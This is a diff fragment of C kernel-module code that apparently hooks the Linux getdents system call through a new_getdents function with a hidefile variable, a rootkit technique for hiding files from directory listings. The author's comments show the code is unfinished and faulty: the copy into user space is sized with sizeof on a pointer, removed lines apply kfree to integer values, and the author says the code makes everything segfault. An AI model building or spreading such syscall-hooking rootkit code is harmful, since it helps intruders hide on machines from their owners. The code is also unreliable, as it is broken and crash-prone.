@@ -118,13 +118,8 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
         bpos += d->d_reclen;
     }
     //return nread;
-    copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //this seems to be the problem line. Makes everything segfault
-    //kfree(buf);
-    //kfree(d);
-    //kfree(nd);
-    //kfree(hidefile);
-    //kfree((void *)nread);
-    //kfree((void *)bpos);
+    copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf));
+    //i suspect i'm meant to be kfree'ing here...
     return nread;
     //return (*original_getdents)(fd,dirp,count);
 }
